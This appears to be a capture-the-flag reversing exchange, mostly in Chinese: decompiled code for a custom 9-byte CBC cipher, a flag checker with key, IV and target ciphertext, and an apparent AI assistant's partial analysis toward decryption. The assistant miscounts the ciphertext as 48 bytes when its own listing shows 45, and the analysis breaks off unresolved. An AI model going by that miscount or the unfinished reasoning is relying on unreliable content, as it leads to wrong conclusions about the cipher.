)      {        v24 = (*(_QWORD *)v34)-- == 1LL;        if ( v24 )          Py_Dealloc(v34);      }    }    if ( v26 )    {      if ( (int)*v26 >= 0 )      {        v24 = (*(_QWORD *)v26)-- == 1LL;        if ( v24 )          Py_Dealloc(v26);      }    }    if ( v27 && *v27 >= 0 )    {      v24 = (*(_QWORD *)v27)-- == 1LL;      if ( v24 )        Py_Dealloc(v27);    }    goto LABEL_104;  }  free(v15);  return v18; } __int64 __fastcall sub_1800050E0(__int64 a1, _BYTE *a2, _BYTE *a3, int a4) {  char v7; // al  int v8; // r9d  _BYTE *v9; // rbx  __int64 result; // rax   *(_QWORD *)a1 = 0LL;  *(_BYTE *)(a1 + 8) = 0;  *(_QWORD *)(a1 + 9) = 0LL;  *(_BYTE *)(a1 + 17) = 0;  if ( a2 )    memcpy((void *)a1, a2, *a2 != 0 ? 9 : 0);  if ( a3 )    memcpy((void *)(a1 + 9), a3, *a3 != 0 ? 9 : 0);  v7 = *(_BYTE *)(a1 + 8);  v8 = 9;  *(_QWORD *)(a1 + 18) = *(_QWORD *)a1;  *(_BYTE *)(a1 + 26) = v7;  *(_DWORD *)(a1 + 424) = a4;  v9 = (_BYTE *)(a1 + 27);  do  {    *v9 = 45 * (*(v9 - 9) + byte_180008488[v8 % 9u]);    v9[1] = 45 * (*(v9 - 8) + byte_180008488[v8 - 9 * ((v8 + 1) / 9u) + 1]);    v9[2] = 45 * (*(v9 - 7) + byte_180008488[v8 - 9 * ((v8 + 2) / 9u) + 2]);    v9[3] = 45 * (*(v9 - 6) + byte_180008488[v8 - 9 * ((v8 + 3) / 9u) + 3]);    v9[4] = 45 * (*(v9 - 5) + byte_180008488[v8 - 9 * ((v8 + 4) / 9u) + 4]);    result = (unsigned __int8)(*(v9 - 4) + byte_180008488[v8 - 9 * ((v8 + 5) / 9u) + 5]);    v8 += 6;    v9[5] = 45 * result;    v9 += 6;  }  while ( v8 < 405 );  return result; } unsigned __int64 __fastcall sub_1800052A0(__int64 a1, _BYTE *a2, int a3) {  __int64 v5; // r11  signed int v6; // r9d  int v7; // r10d  unsigned __int64 result; // rax  signed int v9; // r10d  int v10; // ecx  __m128 v11; // xmm0  __m128i v12; // xmm0  _BYTE *v13; // r8  __m128i v14; // xmm0  __int64 v15; // rcx  __int32 v16; // edx  _BYTE *v17; // rcx  _BYTE *v18; // rdi  int v19; // r13d  char v20; // al  _BYTE *v21; // rbx  int v22; // r12d  __int8 v23; // cl  __int8 v24; // dl  __int8 v25; // r8  __int8 v26; // r9  __int8 v27; // r10  __int8 v28; // r11  __int8 v29; // si  __int8 v30; // r14  _BYTE *v31; // rdx  __int8 v32; // cl  __int8 v33; // dl  __int8 v34; // r8  __int8 v35; // r9  __int8 v36; // al  int v37; // [rsp+20h] [rbp-39h]  __int64 v38; // [rsp+28h] [rbp-31h]  __int64 v39; // [rsp+30h] [rbp-29h]  __int64 v42; // [rsp+48h] [rbp-11h]  _BYTE *v43; // [rsp+50h] [rbp-9h]  __m128i v44; // [rsp+60h] [rbp+7h] BYREF   v5 = a3;  v6 = 0;  v7 = 9     * (((int)((unsigned __int64)(954437177LL * a3) >> 32) >> 1)      + 1      + ((unsigned int)((unsigned __int64)(954437177LL * a3) >> 32) >> 31))     - a3;  result = (unsigned int)(9 * (v7 / 9));  v9 = v7 % 9;  v10 = a3 + v9;  v11 = (__m128)_mm_shuffle_epi32(_mm_cvtsi32_si128(v9), 0);  v37 = a3 + v9;  if ( v9 > 0 )  {    if ( (unsigned int)v9 < 0x10 )      goto LABEL_6;    v12 = (__m128i)_mm_and_ps(v11, (__m128)xmmword_1800085A0);    v13 = &a2[a3];    v14 = _mm_packus_epi16(v12, v12);    v44 = _mm_packus_epi16(v14, v14);    v15 = v5;    v16 = v44.m128i_i32[0];    do    {      *(_DWORD *)&a2[v15] = v16;      v6 += 16;      *((_DWORD *)v13 + 1) = v16;      v13 += 16;      *(_DWORD *)&a2[v15 + 8] = v16;      *(_DWORD *)&a2[v15 + 12] = v16;      v15 += 16LL;      result = v15 - v5;    }    while ( v15 - v5 < v9 - (v9 & 0xF) );    if ( v6 < v9 ) LABEL_6:      result = (unsigned __int64)memset(&a2[v5 + v6], (unsigned __int8)v9, (unsigned int)(v9 - v6));    v10 = v37;  }  if ( *(_DWORD *)(a1 + 424) == 1 )  {    *a2 ^= *(_BYTE *)(a1 + 9);    a2[1] ^= *(_BYTE *)(a1 + 10);    a2[2] ^= *(_BYTE *)(a1 + 11);    a2[3] ^= *(_BYTE *)(a1 + 12);    a2[4] ^= *(_BYTE *)(a1 + 13);    a2[5] ^= *(_BYTE *)(a1 + 14);    a2[6] ^= *(_BYTE *)(a1 + 15);    a2[7] ^= *(_BYTE *)(a1 + 16);    result = *(unsigned __int8 *)(a1 + 17);    a2[8] ^= result;  }  if ( v10 > 0 )  {    v17 = (_BYTE *)(a1 + 20);    v18 = a2 + 11;    v42 = -11LL - (_QWORD)a2;    v19 = 9;    v43 = v17;    v38 = 0LL;    v39 = 0LL;    do    {      v20 = *(v18 - 3);      v21 = v17;      v44.m128i_i64[0] = *(_QWORD *)(v18 - 11);      v22 = 0;      v23 = v44.m128i_i8[7];      v24 = v44.m128i_i8[6];      v25 = v44.m128i_i8[5];      v26 = v44.m128i_i8[4];      v27 = v44.m128i_i8[3];      v28 = v44.m128i_i8[2];      v29 = v44.m128i_i8[1];      v30 = v44.m128i_i8[0];      do      {        v44.m128i_i8[0] = v30 ^ 4;        v44.m128i_i8[6] = v24 ^ 8;        v44.m128i_i8[7] = v23 ^ 1;        v44.m128i_i8[1] = v29 ^ 9;        v44.m128i_i8[2] = v28 ^ 2;        v44.m128i_i8[3] = v27 ^ 3;        v44.m128i_i8[4] = v26 ^ 5;        v44.m128i_i8[5] = v25 ^ 7;        v44.m128i_i8[8] = v20 ^ 6;        v31 = v21 - 2;        if ( (v22 & 1) != 0 )          sub_180004E20(&v44, v31);        else          sub_180004F80(&v44, v31);        v32 = *v21 ^ v44.m128i_i8[1];        v33 = v21[1] ^ v44.m128i_i8[2];        v34 = v21[5] ^ v44.m128i_i8[0];        v35 = v21[6] ^ v44.m128i_i8[5];        v44.m128i_i8[0] = *(v21 - 2) ^ v44.m128i_i8[3];        v44.m128i_i8[1] = *(v21 - 1) ^ v44.m128i_i8[8];        v44.m128i_i8[4] ^= v21[2];        v44.m128i_i8[5] = v21[3] ^ v44.m128i_i8[6];        v36 = v21[4] ^ v44.m128i_i8[7];        v44.m128i_i8[2] = v32;        v44.m128i_i8[3] = v33;        v44.m128i_i8[6] = v36;        v44.m128i_i8[7] = v34;        v44.m128i_i8[8] = v35;        if ( (v22 & 1) != 0 )          sub_180004F80(&v44, byte_180008488);        else          sub_180004E20(&v44, byte_180008488);        ++v22;        v21 += 9;        v30 = byte_1800084A0[v44.m128i_u8[0]];        v44.m128i_i8[0] = v30;        v29 = byte_1800084A0[v44.m128i_u8[1]];        v44.m128i_i8[1] = v29;        v28 = byte_1800084A0[v44.m128i_u8[2]];        v44.m128i_i8[2] = v28;        v27 = byte_1800084A0[v44.m128i_u8[3]];        v44.m128i_i8[3] = v27;        v26 = byte_1800084A0[v44.m128i_u8[4]];        v44.m128i_i8[4] = v26;        v25 = byte_1800084A0[v44.m128i_u8[5]];        v44.m128i_i8[5] = v25;        v24 = byte_1800084A0[v44.m128i_u8[6]];        v44.m128i_i8[6] = v24;        v23 = byte_1800084A0[v44.m128i_u8[7]];        v44.m128i_i8[7] = v23;        v20 = byte_1800084A0[v44.m128i_u8[8]];      }      while ( v22 < 45 );      *(_QWORD *)(v18 - 11) = v44.m128i_i64[0];      *(v18 - 3) = v20;      if ( *(_DWORD *)(a1 + 424) == 1 && v19 < v37 )      {        *(v18 - 2) ^= *(v18 - 11);        *(v18 - 1) ^= a2[v38 + 1];        *v18 ^= a2[v39 + 2];        v18[1] ^= *(v18 - 8);        v18[2] ^= *(v18 - 7);        v18[3] ^= *(v18 - 6);        v18[4] ^= *(v18 - 5);        v18[5] ^= *(v18 - 4);        v18[6] ^= *(v18 - 3);      }      v18 += 9;      v38 += 9LL;      result = (unsigned __int64)&v18[v42];      v39 += 9LL;      v19 += 9;      v17 = v43;    }    while ( (__int64)&v18[v42] < v37 );  }  return result; } .rdata:0000000180008488 ; _BYTE byte_180008488[24] .rdata:0000000180008488 byte_180008488  db 4, 9, 2, 3, 5, 7, 8, 1, 6, 0Fh dup(0) .rdata:0000000180008488                                         ; DATA XREF: sub_1800050E0+63↑o .rdata:0000000180008488                                         ; sub_1800052A0+2B3↑o .rdata:00000001800084A0 ; _BYTE byte_1800084A0[256] .rdata:00000001800084A0 byte_1800084A0  db 38h, 0D6h, 18h, 0Eh, 0C6h, 0A4h, 47h, 4Ah, 97h, 0A1h .rdata:00000001800084AA                 db 0A2h, 79h, 0E3h, 0F9h, 61h, 0Bh, 0C3h, 0FAh, 8, 32h .rdata:00000001800084B4                 db 5Fh, 73h, 4Fh, 6Ch, 0BEh, 68h, 7Bh, 0B3h, 4Ch, 1Bh .rdata:00000001800084BE                 db 8Dh, 3Ch, 63h, 0F5h, 0E8h, 0D8h, 0CBh, 0CFh, 0BCh, 0C1h .rdata:00000001800084C8                 db 9Ah, 3Fh, 6Fh, 9Fh, 70h, 0CAh, 60h, 49h, 30h, 0E6h .rdata:00000001800084D2                 db 86h, 90h, 0C8h, 1Fh, 0E5h, 6Eh, 8Eh, 0, 2Eh, 36h, 0EAh .rdata:00000001800084DD                 db 91h, 5Dh, 92h, 2Dh, 6Bh, 0EFh, 0C9h, 0DFh, 0ACh, 0F7h .rdata:00000001800084E7                 db 20h, 9Bh, 99h, 58h, 0B8h, 74h, 16h, 42h, 0F3h, 0B5h .rdata:00000001800084F1                 db 89h, 2Ch, 0DAh, 12h, 87h, 0E1h, 0ADh, 0FFh, 19h, 9Eh .rdata:00000001800084FB                 db 80h, 27h, 0B6h, 8Fh, 53h, 65h, 0DEh, 24h, 2Ah, 78h .rdata:0000000180008505                 db 82h, 95h, 9, 34h, 48h, 0D2h, 33h, 0E2h, 3Dh, 55h, 0BBh .rdata:0000000180008510                 db 0Dh, 6Ah, 8Ah, 6Dh, 0ABh, 2, 59h, 1, 2Bh, 56h, 0DCh .rdata:000000018000851B                 db 14h, 72h, 0B0h, 15h, 37h, 0CEh, 8Bh, 0B4h, 39h, 0AFh .rdata:0000000180008525                 db 83h, 10h, 88h, 26h, 0F2h, 40h, 84h, 98h, 0C2h, 5Bh .rdata:000000018000852F                 db 0DBh, 46h, 51h, 7Eh, 0A0h, 0A3h, 0D4h, 85h, 43h, 0DDh .rdata:0000000180008539                 db 0E0h, 3Ah, 17h, 0D9h, 0AAh, 23h, 4Dh, 0FEh, 21h, 44h .rdata:0000000180008543                 db 0C5h, 1Ah, 31h, 9Dh, 2Fh, 0A5h, 0A7h, 71h, 54h, 5Ch .rdata:000000018000854D                 db 5Eh, 0C4h, 41h, 0B7h, 0B1h, 0F0h, 0C0h, 5, 1Ch, 66h .rdata:0000000180008557                 db 7Fh, 29h, 77h, 0CCh, 57h, 0FDh, 4Eh, 13h, 28h, 5Ah .rdata:0000000180008561                 db 0F4h, 0D1h, 50h, 96h, 0D7h, 52h, 0D3h, 0BDh, 0EEh, 9Ch .rdata:000000018000856B                 db 7Ah, 0F8h, 0EBh, 93h, 3Bh, 0D0h, 69h, 81h, 3, 22h, 45h .rdata:0000000180008576                 db 0E4h, 0Ah, 7Ch, 0A9h, 0F6h, 62h, 0A8h, 3Eh, 0BFh, 7Dh .rdata:0000000180008580                 db 67h, 0ECh, 0Ch, 1Dh, 0E7h, 4Bh, 0CDh, 0EDh, 94h, 0A6h .rdata:000000018000858A                 db 8Ch, 4, 75h, 0FCh, 1Eh, 0FBh, 0B2h, 7, 0Fh, 0D5h, 0B9h .rdata:0000000180008595                 db 76h, 11h, 25h, 35h, 0BAh, 0F1h, 0C7h, 64h, 0AEh, 6 .rdata:000000018000859F                 db 0E9h .rdata:00000001800085A0 xmmword_1800085A0 xmmword 0FF000000FF000000FF000000FFh __int64 __fastcall sub_180004E20(_BYTE *a1, _BYTE *a2) {  unsigned __int8 v4; // r8  char v5; // al  char v6; // dl  char v7; // cl  char v8; // al  char v9; // dl  unsigned __int8 v10; // r8  char v11; // dl  char v12; // cl  char v13; // al  char v14; // dl  unsigned __int8 v15; // r8  char v16; // dl  char v17; // cl  char v18; // al  char v19; // dl  unsigned __int8 v20; // r8  char v21; // dl  char v22; // cl  char v23; // al  char v24; // dl  unsigned __int8 v25; // r8  char v26; // dl  char v27; // cl  char v28; // al  char v29; // dl  char v30; // r8  char v31; // dl  char v32; // r8  __int64 result; // rax  char v34; // dl  char v35; // r8   v4 = a1[1];  *a1 = __ROL1__(*a1, *a2 & 7);  v5 = a2[1] & 7;  v6 = v4 >> (8 - v5);  v7 = v5;  v8 = a2[2] & 7;  v9 = (v4 << v7) | v6;  v10 = a1[2];  a1[1] = v9;  v11 = v10 >> (8 - v8);  v12 = v8;  v13 = a2[3] & 7;  v14 = (v10 << v12) | v11;  v15 = a1[3];  a1[2] = v14;  v16 = v15 >> (8 - v13);  v17 = v13;  v18 = a2[4] & 7;  v19 = (v15 << v17) | v16;  v20 = a1[4];  a1[3] = v19;  v21 = v20 >> (8 - v18);  v22 = v18;  v23 = a2[5] & 7;  v24 = (v20 << v22) | v21;  v25 = a1[5];  a1[4] = v24;  v26 = v25 >> (8 - v23);  v27 = v23;  v28 = a2[6] & 7;  v29 = (v25 << v27) | v26;  v30 = a1[6];  a1[5] = v29;  v31 = __ROL1__(v30, v28);  v32 = a1[7];  a1[6] = v31;  result = a2[8] & 7;  v34 = __ROL1__(v32, a2[7] & 7);  v35 = a1[8];  a1[7] = v34;  a1[8] = __ROL1__(v35, result);  return result; } unsigned __int8 __fastcall sub_180004F80(unsigned __int8 *a1, _BYTE *a2) {  unsigned __int8 v2; // r9  char v5; // r8  char v6; // dl  char v7; // al  char v8; // cl  unsigned __int8 v9; // r8  char v10; // al  char v11; // cl  char v12; // dl  unsigned __int8 v13; // al  unsigned __int8 v14; // r8  char v15; // al  char v16; // cl  char v17; // dl  unsigned __int8 v18; // al  unsigned __int8 v19; // r8  char v20; // al  char v21; // cl  char v22; // dl  unsigned __int8 v23; // al  unsigned __int8 v24; // r8  char v25; // al  char v26; // cl  char v27; // dl  unsigned __int8 v28; // al  unsigned __int8 v29; // r8  char v30; // al  char v31; // cl  char v32; // dl  unsigned __int8 v33; // al  unsigned __int8 v34; // r8  unsigned __int8 v35; // al  unsigned __int8 v36; // r8  char v37; // dl  unsigned __int8 v38; // al  unsigned __int8 v39; // r8  unsigned __int8 result; // al   v2 = *a1;  v5 = *a2 & 7;  v6 = a2[1] & 7;  v7 = *a1 << (8 - v5);  v8 = v5;  v9 = a1[1];  *a1 = (v2 >> v8) | v7;  v10 = v9 << (8 - v6);  v11 = v6;  v12 = a2[2] & 7;  v13 = (v9 >> v11) | v10;  v14 = a1[2];  a1[1] = v13;  v15 = v14 << (8 - v12);  v16 = v12;  v17 = a2[3] & 7;  v18 = (v14 >> v16) | v15;  v19 = a1[3];  a1[2] = v18;  v20 = v19 << (8 - v17);  v21 = v17;  v22 = a2[4] & 7;  v23 = (v19 >> v21) | v20;  v24 = a1[4];  a1[3] = v23;  v25 = v24 << (8 - v22);  v26 = v22;  v27 = a2[5] & 7;  v28 = (v24 >> v26) | v25;  v29 = a1[5];  a1[4] = v28;  v30 = v29 << (8 - v27);  v31 = v27;  v32 = a2[6] & 7;  v33 = (v29 >> v31) | v30;  v34 = a1[6];  a1[5] = v33;  v35 = __ROR1__(v34, v32);  v36 = a1[7];  a1[6] = v35;  v37 = a2[8] & 7;  v38 = __ROR1__(v36, a2[7] & 7);  v39 = a1[8];  a1[7] = v38;  result = __ROR1__(v39, v37);  a1[8] = result;  return result; } 运行 import luo_shu print(luo_shu.encrypt(b"aaaa",1,b"123456789",b"987654321")) 得到b'\x8e\x9e=\xc0or\x81y\xcc' 下面是源程序里的内容，也是你需要解密的内容 # Decompiled with PyLingual (https://pylingual.io) # Internal filename: luoshu_c.py # Bytecode version: 3.12.0rc2 (3531) # Source timestamp: 1970-01-01 00:00:00 UTC (0) global stop_animation  # inserted global input_buffer  # inserted import sys import os import time import random import threading import msvcrt from colorama import init, Fore, Style init() magic_square = [[4, 9, 2], [3, 5, 7], [8, 1, 6]] input_buffer = '' stop_animation = False COLOR_MAP = {1: Fore.RED + Style.BRIGHT, 2: Fore.GREEN + Style.BRIGHT, 3: Fore.BLUE + Style.BRIGHT, 4: Fore.YELLOW, 5: Fore.WHITE + Style.BRIGHT, 6: Fore.CYAN, 7: Fore.MAGENTA, 8: Fore.RED, 9: Fore.GREEN} def clear_lines(n):    for _ in range(n):        sys.stdout.write('[1A')        sys.stdout.write('[2K')    sys.stdout.flush() def goto_line(line):    sys.stdout.write(f'[{line + 1};1H') def clear_line():    sys.stdout.write('[2K')    return def print_magic_square():    clear_lines(10)    goto_line(0)    top = '  ┌───┬───┬───┐'    middle = '  ├───┼───┼───┤'    bottom = '  └───┴───┴───┘'    sys.stdout.write(top + '\n')    for i in range(3):        line = '  │'        for j in range(3):            num = magic_square[i][j]            color = COLOR_MAP.get(num, Fore.WHITE)            line += f' {color}{num}{Style.RESET_ALL} │'        sys.stdout.write(line + '\n')        if i < 2:            sys.stdout.write(middle + '\n')    sys.stdout.write(bottom + '\n')    sys.stdout.write('\n')    sys.stdout.flush() def shift_row_left(row):    magic_square[row] = magic_square[row][1:] + [magic_square[row][0]] def shift_row_right(row):    magic_square[row] = [magic_square[row][(-1)]] + magic_square[row][:(-1)] def shift_col_up(col):    t = magic_square[0][col]    magic_square[0][col] = magic_square[1][col]    magic_square[1][col] = magic_square[2][col]    magic_square[2][col] = t def shift_col_down(col):    t = magic_square[2][col]    magic_square[2][col] = magic_square[1][col]    magic_square[1][col] = magic_square[0][col]    magic_square[0][col] = t def random_transform():    op = random.randint(0, 3)    idx = random.randint(0, 2)    if op == 0:        shift_row_left(idx)    else:  # inserted        if op == 1:            shift_row_right(idx)        else:  # inserted            if op == 2:                shift_col_up(idx)            else:  # inserted                shift_col_down(idx) def animation_loop():    while not stop_animation:        time.sleep(0.5)        if not stop_animation:            random_transform()            print_magic_square()            goto_line(10)            clear_line()            sys.stdout.write(f'Input your flag: {input_buffer}')            sys.stdout.flush() if __name__ == '__main__':    os.system('cls')    for _ in range(12):        print()    goto_line(0)    print_magic_square()    goto_line(10)    sys.stdout.write('Input your flag: ')    sys.stdout.flush()    target_hex = '490e0ad0374f2cdd126e5b184bf4e6da669a4cbea88fac916494edd90149809a7c92eec2e82ed3fca5812d9f69'    anim_thread = threading.Thread(target=animation_loop, daemon=True)    anim_thread.start()    try:            while True:                if msvcrt.kbhit():                    ch = msvcrt.getch()                    if ch in {b'\r', b'\n'}:                        if len(input_buffer)!= 45:                            goto_line(11)                            sys.stdout.write(Fore.RED + 'Length wrong!' + Style.RESET_ALL + '                              ')                            sys.stdout.flush()                            time.sleep(1.5)                            goto_line(11)                            clear_line()                            goto_line(10)                            clear_line()                            sys.stdout.write(f'Input your flag: {input_buffer}')                            sys.stdout.flush()                finally:  # inserted                    try:                        import luo_shu                        msg = input_buffer.encode()                        key = b'LESCBCKEY'                        iv = b'LESCBC_iv'                        cipher = luo_shu.encrypt(msg, 1, key, iv)                        result_hex = cipher.hex()                except Exception as e:                    else:  # inserted                        goto_line(11)                        if result_hex == target_hex:                            sys.stdout.write(Fore.GREEN + 'Right flag! Congratulations!' + Style.RESET_ALL + '                    ')                        else:  # inserted                            sys.stdout.write(Fore.RED + 'Wrong flag! Try again.' + Style.RESET_ALL + '                         ')                        sys.stdout.flush()                        time.sleep(2)                else:  # inserted                    if ch == b'\x08':                        if input_buffer:                            input_buffer = input_buffer[:(-1)]                            goto_line(10)                            clear_line()                            sys.stdout.write(f'Input your flag: {input_buffer}')                            sys.stdout.flush()                    else:  # inserted                        if len(input_buffer) < 45:                            char = ch.decode('ascii', errors='ignore')                            if char and 32 <= ord(char) <= 126:                                input_buffer += char                                sys.stdout.write(char)                                sys.stdout.flush()            time.sleep(0.01)        finally:  # inserted            stop_animation = True            anim_thread.join(timeout=0.1)            print('\n')    result_hex = '' 给出完整解密脚本 还需要什么内容请询问我









首先，我需要理解加密过程。从代码中可以看出，加密函数是`luo_shu.encrypt`，它接受四个参数：`message`、`mode`、`key`和`iv`。在主程序中，加密时使用了`mode=1`，密钥`key=b'LESCBCKEY'`，初始化向量`iv=b'LESCBC_iv'`，以及用户输入的字符串（长度为45字节）作为消息。

目标密文是：`490e0ad0374f2cdd126e5b184bf4e6da669a4cbea88fac916494edd90149809a7c92eec2e82ed3fca5812d9f69`

我需要解密这个密文以得到原始消息。

从IDA反汇编的代码中，我看到了加密函数的具体实现。加密函数是`sub_180001510`，它调用了`sub_1800050E0`和`sub_1800052A0`。此外，还有两个辅助函数`sub_180004E20`和`sub_180004F80`，它们似乎是进行位旋转操作的。

关键点是加密算法。从代码中，我注意到它使用了一个魔方（magic square）的概念，但实际加密过程似乎是一种块密码。从`sub_1800052A0`函数中，我看到它处理数据块，并且有一个循环，每次处理9字节？因为代码中有很多与9相关的操作。

在`sub_1800052A0`中，有一个循环，其中`v19`从9开始，每次增加9，直到达到消息长度。消息长度被填充为9的倍数。在加密开始前，消息被填充：如果消息长度不是9的倍数，则填充一些字节，使长度成为9的倍数。填充的值是填充的字节数。

在`sub_180001510`中，有：

c

```
  v9 = *(_QWORD *)(a2 + 16);  // 消息长度
  // ...
  v10 = 0;
  if ( (int)v9 % 9 )
    v10 = (unsigned int)((int)v9 % 9) >> 31;
  v11 = 0;
  v12 = (int)(9 - 9 * v10 - (int)v9 % 9) % 9;
  if ( v12 )
    v11 = v12 >> 31;
  v13 = v12 + 8 * v11 + v11;  // 填充长度
```



这计算了填充长度。实际上，填充长度`v13`是`(9 - (v9 % 9)) % 9`，但更简单的是，如果消息长度不是9的倍数，则填充到9的倍数，填充值为填充的字节数。

然后，分配内存，复制原始消息，并填充字节。

之后，调用`sub_1800050E0`，它初始化一个状态结构，使用key和iv。然后调用`sub_1800052A0`进行加密。

在`sub_1800052A0`中，如果模式为1（加密），则先与iv进行异或：

c

```
  if ( *(_DWORD *)(a1 + 424) == 1 )
  {
    *a2 ^= *(_BYTE *)(a1 + 9);
    a2[1] ^= *(_BYTE *)(a1 + 10);
    // ... 直到a2[8]
  }
```



然后，对于每个9字节块，进行多轮变换。从代码中，我看到有45轮？因为`v22`从0到44。

在每一轮中，它先对块中的字节进行一些置换和异或操作，然后使用两个函数`sub_180004E20`和`sub_180004F80`进行旋转，还有一个S盒（`byte_1800084A0`）进行替换。

具体步骤在`sub_1800052A0`的循环中：

1. 从消息块中加载9字节到`v44`（一个数组）。

2. 然后进行一些异或操作：

   c

   ```
   v44.m128i_i8[0] = v30 ^ 4;
   v44.m128i_i8[6] = v24 ^ 8;
   v44.m128i_i8[7] = v23 ^ 1;
   v44.m128i_i8[1] = v29 ^ 9;
   v44.m128i_i8[2] = v28 ^ 2;
   v44.m128i_i8[3] = v27 ^ 3;
   v44.m128i_i8[4] = v26 ^ 5;
   v44.m128i_i8[5] = v25 ^ 7;
   v44.m128i_i8[8] = v20 ^ 6;
   ```

   

   这里，`v30`到`v20`是来自消息块的字节。异或的值是魔方中的数字？魔方是：

   text

   ```
   4,9,2
   3,5,7
   8,1,6
   ```

   

   所以异或的值是4,9,2,3,5,7,8,1,6，但顺序不同。实际上，这里异或的是4,9,2,3,5,7,8,1,6，但对应位置不同。

   从代码看：

   - 索引0: v30 ^ 4
   - 索引1: v29 ^ 9
   - 索引2: v28 ^ 2
   - 索引3: v27 ^ 3
   - 索引4: v26 ^ 5
   - 索引5: v25 ^ 7
   - 索引6: v24 ^ 8
   - 索引7: v23 ^ 1
   - 索引8: v20 ^ 6

   所以，实际上是对9个字节分别异或一个常数：4,9,2,3,5,7,8,1,6。

3. 然后，根据轮数的奇偶性，调用`sub_180004E20`或`sub_180004F80`。这些函数是旋转函数，它们根据一个表（可能是key相关的）进行位旋转。

4. 之后，与状态中的一些值进行异或：

   c

   ```
   v32 = *v21 ^ v44.m128i_i8[1];
   v33 = v21[1] ^ v44.m128i_i8[2];
   v34 = v21[5] ^ v44.m128i_i8[0];
   v35 = v21[6] ^ v44.m128i_i8[5];
   v44.m128i_i8[0] = *(v21 - 2) ^ v44.m128i_i8[3];
   v44.m128i_i8[1] = *(v21 - 1) ^ v44.m128i_i8[8];
   v44.m128i_i8[4] ^= v21[2];
   v44.m128i_i8[5] = v21[3] ^ v44.m128i_i8[6];
   v36 = v21[4] ^ v44.m128i_i8[7];
   ```

   

   这里`v21`指向状态结构中的某个位置。状态结构是在`sub_1800050E0`中初始化的。

5. 然后再次根据轮数的奇偶性调用旋转函数，但这次使用固定的表`byte_180008488`？从代码看：

   c

   ```
   if ( (v22 & 1) != 0 )
     sub_180004F80(&v44, byte_180008488);
   else
     sub_180004E20(&v44, byte_180008488);
   ```

   

   `byte_180008488`是那个魔方数组：`[4,9,2,3,5,7,8,1,6]`，但后面是0。

6. 然后应用S盒`byte_1800084A0`，这是一个256字节的替换表。

7. 循环45轮后，将变换后的字节写回消息块。

8. 如果在加密模式，并且不是第一个块，则与上一个块进行异或？代码中：

   c

   ```
   if ( *(_DWORD *)(a1 + 424) == 1 && v19 < v37 )
   {
     *(v18 - 2) ^= *(v18 - 11);
     *(v18 - 1) ^= a2[v38 + 1];
     *v18 ^= a2[v39 + 2];
     v18[1] ^= *(v18 - 8);
     v18[2] ^= *(v18 - 7);
     v18[3] ^= *(v18 - 6);
     v18[4] ^= *(v18 - 5);
     v18[5] ^= *(v18 - 4);
     v18[6] ^= *(v18 - 3);
   }
   ```

   

   这看起来像是CBC模式的异或，但异或的是前一个块的对应字节？这里`v18`指向当前块的开始，`v18-11`指向前一个块的开始？因为每个块9字节，所以`v18-11`可能不是前一个块的开头。需要仔细看。

   从代码上下文，`v18`是当前指针，`a2`是消息数组，`v38`和`v39`是索引。实际上，这里可能是在进行CBC模式的异或，但块大小是9字节。

   在加密开始时，第一个块与iv异或，然后加密，然后下一个块与上一个密文块异或，再加密。

   从代码中，在加密函数开始时，如果模式为1，先与iv异或：

   c

   ```
   if ( *(_DWORD *)(a1 + 424) == 1 )
   {
     *a2 ^= *(_BYTE *)(a1 + 9);  // iv[0]
     // ...
   }
   ```

   

   然后，在处理每个块后，对于后续块，与上一个块异或：

   c

   ```
   if ( *(_DWORD *)(a1 + 424) == 1 && v19 < v37 )
   {
     // v18指向当前块的开始，v18-11指向上一个块的开始？因为v18 = a2 + 11 + ...? 
     // 实际上，v18是从a2+11开始，然后每次增加9，所以v18-11是上一个块的开始？不对。
     // 让我们看变量定义：v18 = a2 + 11; 然后v18 += 9; 所以v18-11是a2，即第一个块的开始？但第一个块已经处理过了。
     // 可能这里v18指向当前块的第三个字节？混乱。
   
     // 从代码看，v18被初始化为a2+11，然后循环中每次增加9。所以对于第一个块，v18=a2+11，那么v18-11=a2，即第一个块的开头。
     // 但第一个块已经加密了，所以对于第二个块，v18=a2+20，那么v18-11=a2+9，即第二个块的开头？不对，a2+9是第一个块的结束？因为块是9字节，所以第一个块是a2[0..8]，第二个块是a2[9..17]，等等。
     // v18 = a2 + 11，然后v18 +=9，所以第一次循环v18=a2+11，第二次v18=a2+20，第三次a2+29，等等。
     // 那么v18-11对于第一次是a2，对于第二次是a2+9，对于第三次是a2+18，等等。所以v18-11正好指向上一个块的开头。
     // 所以这里确实是与上一个密文块异或。
   }
   ```

   

所以，加密模式是CBC，块大小9字节，使用自定义的块加密函数。

现在，为了解密，我需要实现解密函数。既然加密函数是`luo_shu.encrypt`，但可能没有直接提供解密函数。所以我需要根据加密逻辑编写解密函数。

解密步骤：

1. 首先，密文长度应该是9的倍数。目标密文是16进制字符串，长度为96字节，所以是48字节？96/2=48字节。但48不是9的倍数？48/9=5.333，所以有填充？在加密时，消息被填充到9的倍数，所以密文也是9的倍数。48不是9的倍数，所以可能我算错了。

目标密文是：'490e0ad0374f2cdd126e5b184bf4e6da669a4cbea88fac916494edd90149809a7c92eec2e82ed3fca5812d9f69'
计算长度：去掉空格，字符串长度是96？数一下：49 0e 0a d0 37 4f 2c dd 12 6e 5b 18 4b f4 e6 da 66 9a 4c be a8 8f ac 91 64 94 ed d9 01 49 80 9a 7c 92 ee c2 e8 2e d3 fc a5 81 2d 9f 69
我数了有96个字符，所以48字节。48不是9的倍数，所以可能密文没有包括填充？但在加密时，消息被填充，所以密文包括填充。但这里48字节，所以可能填充了3字节？因为45+3=48？45是输入长度，填充3字节，所以密文48字节，是9的倍数？48/9=5.333，不是整数。9*5=45, 9*6=54, 所以48不是9的倍数。这有问题。

再看加密函数：在`sub_180001510`中，计算填充长度，然后分配内存为`v13 + (int)v9`，即填充长度 + 原始长度。然后加密这个整个缓冲区。所以密文长度是填充后的长度，应该是9的倍数。

但48不是9的倍数，所以可能我看错了。或许密文字符串是16进制表示，长度是96字符，即48字节，但48不是9的倍数。所以可能密文是经过编码的？或者我误读了代码。

在主程序中，密文是`target_hex`，字符串长度是96，所以48字节。但用户输入是45字节，加密后是48字节，所以填充了3字节？45+3=48，但48不是9的倍数，9*5=45, 9*6=54, 所以48不是9的倍数。这矛盾。

或许填充机制不同。在加密函数中，填充长度计算为`v13 = (9 - (v9 % 9)) % 9`，如果v9=45, 45%9=0, so v13=0? 那么没有填充？但45不是9的倍数吗？45/9=5, 所以是9的倍数，所以没有填充。那么密文长度应该是45字节？但这里密文是48字节，所以不对。

再看代码：在`sub_180001510`中，v9是消息长度，45。v9 % 9 = 0, so v12=0, v13=0? 但代码中：

c

```
  v10 = 0;
  if ( (int)v9 % 9 )
